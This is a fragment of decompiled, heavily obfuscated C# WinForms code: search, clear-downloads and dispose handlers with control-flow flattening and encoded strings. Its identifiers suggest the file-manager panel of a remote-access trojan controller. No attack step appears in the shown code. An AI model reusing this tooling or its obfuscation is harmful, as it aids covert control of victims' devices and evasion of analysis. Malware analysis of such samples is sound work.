          switch ((num8 = (uint) ~-(~num7 + ((-2038625665 * -1404487687 + (-245172960 - 714137738)) * 1656703645 - ~-1025792432))) % 3U)
          {
            case 0:
              goto label_19;
            case 1:
              ProjectData.ClearProjectError();
              num7 = (int) num8 * -1467512682 ^ 802140114;
              continue;
            case 2:
              goto label_14;
            default:
              goto label_10;
          }
        }
label_14:
        return;
label_10:;
      }
    }

    private void Clearsrchbtn_Click(object sender, EventArgs e)
    {
      this.searchtext.Text = EXGuarder.\u0036E735347;
    }

    private void Searchtext_TextChanged(object sender, EventArgs e)
    {
      ((Jector) this).searchbefore.Clear();
      if (string.IsNullOrEmpty(this.searchtext.Text))
        goto label_5;
label_1:
      int num1 = -494413408;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(~num1 + (-1233629935 - -1622500871 - -1490700201 * --192510157 - -1613682519) + (-1637608724 - -203509318 - -1455514839 - ~(1318503819 ^ -1941171069)))) % 5U)
        {
          case 0:
            goto label_3;
          case 1:
            this.clearsrchbtn.Visible = true;
            num1 = (int) num2 * 2077400317 ^ -1042089411;
            continue;
          case 2:
            num1 = (int) num2 * 1454106951 ^ 1397661014;
            continue;
          case 3:
            goto label_5;
          case 4:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_5:
      this.clearsrchbtn.Visible = false;
      num1 = 699285481;
      goto label_2;
    }

    private void Searchbtn_Click(object sender, EventArgs e)
    {
      if (this.DGV0.Rows.Count >= 1)
        goto label_4;
label_1:
      int num1 = -574750211;
label_2:
      int index;
      bool flag;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) ((-num1 ^ -(-2086138119 * 330762795) - (~-523991015 + ~962866530) * 1723585111) * 1082470359 * -112042855 - (-446011082 - 1584255938))) % 8U)
        {
          case 0:
            index = 0;
            num1 = (int) num3 * 1387199605 ^ -12772066;
            continue;
          case 1:
            goto label_3;
          case 3:
            goto label_1;
          case 4:
            flag = true;
            num2 = checked (this.DGV0.Rows.Count - 1);
            num1 = 938069716;
            continue;
          case 5:
            CraxsAlert.Showinformation(EXGuarder.\u00333456C43);
            num1 = (int) num3 * -679068668 ^ -1340979794;
            continue;
          case 6:
            goto label_18;
          case 7:
            goto label_4;
          default:
            goto label_8;
        }
      }
label_18:
      return;
label_3:
      CraxsAlert.Showinformation(EXGuarder.\u0031D145665);
      return;
label_8:
      if (index <= num2)
      {
        try
        {
          DataGridViewRow row = this.DGV0.Rows[index];
          if (!((Jector) this).searchbefore.Contains(row))
            goto label_14;
label_10:
          int num4 = -872461966;
label_11:
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) ((-num4 ^ -(-2086138119 * 330762795) - (~-523991015 + ~962866530) * 1723585111) * 1082470359 * -112042855 - (-446011082 - 1584255938))) % 8U)
            {
              case 1:
                this.DGV0.ClearSelection();
                num4 = (int) num5 * 1015220694 ^ 645733808;
                continue;
              case 2:
                this.DGV0.FirstDisplayedScrollingRowIndex = index;
                row.Selected = true;
                num4 = (int) num5 * 37316195 ^ 2087562967;
                continue;
              case 3:
                int num6 = !(row.Cells[1].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | row.Cells[2].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | row.Cells[3].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | row.Cells[4].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | row.Cells[5].Value.ToString().Contains(this.searchtext.Text.ToLower())) ? 133322911 : (num6 = -715281106);
                num4 = num6 ^ (int) num5 * -2039617615;
                continue;
              case 4:
                goto label_14;
              case 5:
                goto label_17;
              case 7:
                goto label_10;
              default:
                goto label_20;
            }
          }
label_17:
          ((Jector) this).searchbefore.Add(row);
          goto label_25;
label_14:
          flag = false;
          num4 = -1539624801;
          goto label_11;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_20:
        checked { ++index; }
      }
      else
        goto label_25;
label_21:
      int num7 = 330147305;
label_22:
      while (true)
      {
        uint num8;
        switch ((num8 = (uint) ((-num7 ^ -(-2086138119 * 330762795) - (~-523991015 + ~962866530) * 1723585111) * 1082470359 * -112042855 - (-446011082 - 1584255938))) % 5U)
        {
          case 0:
            goto label_21;
          case 1:
            CraxsAlert.Showinformation(EXGuarder.\u0032B266D40);
            num7 = (int) num8 * -709013907 ^ 622735099;
            continue;
          case 2:
            goto label_8;
          case 3:
            goto label_25;
          case 4:
            goto label_23;
          default:
            goto label_12;
        }
      }
label_23:
      return;
label_12:
      return;
label_25:
      num7 = !flag ? -1449636319 : (num7 = 579530718);
      goto label_22;
label_4:
      num1 = !string.IsNullOrEmpty(this.searchtext.Text) ? 382077000 : (num1 = 1530086697);
      goto label_2;
    }

    private void ClearButton_Click_1(object sender, EventArgs e)
    {
      try
      {
        if (this.DGVDATA.Rows.Count <= 0)
          return;
label_1:
        int num1 = 557193046;
        int index;
        while (true)
        {
          int num2 = num1;
          uint num3;
          int num4;
          switch ((num3 = (uint) ~(-(((-((144880343 ^ 230746987) - -1705773911 + -802490075 * 203006368 * 922429579) ^ -430244113 * (-(535710958 - 1314088173) + (-1578316503 ^ -302734503 - 470635255))) - num2) * 1168722921 ^ 895329399) * 639183999)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              num4 = checked (this.DGVDATA.Rows.Count - 1);
              num1 = (int) num3 * 1162420166 ^ 1393320974;
              continue;
            case 3:
              index = num4;
              num1 = (int) num3 * 2071474831 ^ 1857620340;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        while (index >= 0)
        {
          try
          {
            DataGridViewRow row = this.DGVDATA.Rows[index];
            if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject((object) (row.Tag == null), Operators.CompareObjectEqual(row.Tag, (object) EXGuarder.\u0034D2A5101, false)), Operators.CompareObjectEqual(row.Tag, (object) EXGuarder.\u0032C294B13, false)), Operators.CompareObjectEqual(row.Tag, (object) EXGuarder.\u00315496963, false))))
            {
              try
              {
                string key = row.Cells[0].Value.ToString();
label_8:
                int num5 = 602173077;
                while (true)
                {
                  int num6 = num5;
                  uint num7;
                  FileStream fileStream;
                  switch ((num7 = (uint) ~(-(((-((144880343 ^ 230746987) - -1705773911 + -802490075 * 203006368 * 922429579) ^ -430244113 * (-(535710958 - 1314088173) + (-1578316503 ^ -302734503 - 470635255))) - num6) * 1168722921 ^ 895329399) * 639183999)) % 7U)
                  {
                    case 1:
                      fileStream = (FileStream) null;
                      num5 = (int) num7 * -226607843 ^ 164805873;
                      continue;
                    case 2:
                      fileStream.Dispose();
                      num5 = (int) num7 * -1747363488 ^ -1331007825;
                      continue;
                    case 3:
                      fileStream.Close();
                      num5 = (int) num7 * -350608092 ^ -1276177319;
                      continue;
                    case 4:
                      int num8 = fileStream == null ? 1865982906 : (num8 = 1636810211);
                      num5 = num8 ^ (int) num7 * 65999229;
                      continue;
                    case 5:
                      fileStream = (FileStream) NewLateBinding.LateIndexGet(RuntimeHelpers.GetObjectValue(reso.GETKEY(key, ((Jector) this).DownStreams)), new object[1]
                      {
                        (object) 0
                      }, (string[]) null);
                      num5 = (int) num7 * 1360799163 ^ -937580188;
                      continue;
                    case 6:
                      goto label_8;
                    default:
                      goto label_20;
                  }
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
label_16:
                int num9 = -1106959246;
                while (true)
                {
                  int num10 = num9;
                  uint num11;
                  switch ((num11 = (uint) ~(-(((-((144880343 ^ 230746987) - -1705773911 + -802490075 * 203006368 * 922429579) ^ -430244113 * (-(535710958 - 1314088173) + (-1578316503 ^ -302734503 - 470635255))) - num10) * 1168722921 ^ 895329399) * 639183999)) % 3U)
                  {
                    case 0:
                      goto label_16;
                    case 1:
                      ProjectData.ClearProjectError();
                      num9 = (int) num11 * -877211401 ^ 607691669;
                      continue;
                    default:
                      goto label_20;
                  }
                }
              }
label_20:
              this.DGVDATA.Rows.RemoveAt(row.Index);
              this.Downloadnum.Text = this.DGVDATA.Rows.Count.ToString();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          checked { index += -1; }
label_24:
          int num12 = 1359660517;
          uint num13;
          switch ((num13 = (uint) ~(-(((-((144880343 ^ 230746987) - -1705773911 + -802490075 * 203006368 * 922429579) ^ -430244113 * (-(535710958 - 1314088173) + (-1578316503 ^ -302734503 - 470635255))) - num12) * 1168722921 ^ 895329399) * 639183999)) % 3U)
          {
            case 0:
              goto label_24;
            case 1:
              continue;
            case 2:
              return;
            default:
              return;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    static FileManager()
    {
      PermissionsManager.WM_NCLBUTTONDOWN = 161;
label_1:
      int num1 = -502013832;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((-1372517509 * (697138616 ^ -7337569) - (-(-2080081050 * 731804539 - 93990542 * 508016357 + -1977837858 * -2006946963) - (num2 - ~~(~(365393677 * -1826427025) ^ 1298392236)) ^ (~1905510458 - ~1986043615) * 1893245911)) * -997152339 + 2095067104)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            PermissionsManager.HT_CAPTION = 2;
            num1 = (int) num3 * 1253558027 ^ -1320424399;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -1524469731;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((1046847811 - -1348997789 - --1777147903 + ~(108150028 + 1411002955) - -(num2 - ~(1401503875 * (-1598937741 - -924556392 + 789715137 * -1405369657 ^ -1791974737 ^ -1562743574 ^ -9501414 - 647879359)))) * -2070030951)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              ((Jector) this).components.Dispose();
              num1 = (int) num3 * -325055611 ^ -759578599;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num4 = ((Jector) this).components == null ? -1709081134 : (num4 = 2092660765);
              num1 = num4 ^ (int) num3 * -2116923962;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }
  }
}
